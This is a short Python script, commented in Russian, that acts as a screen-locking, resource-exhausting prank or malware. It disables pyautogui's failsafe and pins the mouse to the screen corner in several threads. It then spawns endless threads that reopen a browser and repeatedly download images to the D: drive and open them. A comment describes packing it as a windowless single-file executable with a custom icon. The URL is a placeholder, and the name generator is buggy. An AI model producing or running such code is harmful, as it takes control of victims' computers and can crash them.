import requests
import webbrowser
from threading import Thread
from random import choice
from os import startfile
import pyautogui

pyautogui.FAILSAFE = False
"""
в конце через терминал прописать pip install pyinstaller
pyinstaller -i "D:\icon.png" -W -F main.py" """
url = "?"


def gen_name(num: int = 8):
    g = ""
    for i in range(num):
        g += choice(list("тут должна быть пикча с форматом jpg"))
        return g


def browser_open():
    while True:
        webbrowser.open(url)


def img():
    while True:
        p = requests.get(url)
        name = gen_name()
        out = open(f"D:/{name}.jpg", 'wb')
        out.write(p.content)
        out.close()
        startfile(rf"D:/{name}.jpg")


def lock():
    while True:
        pyautogui.moveTo(0, 0)


for i in range(5):
    Thread(target=lock).start()
while True:
    Thread(target=browser_open).start()
    Thread(target=img).start()
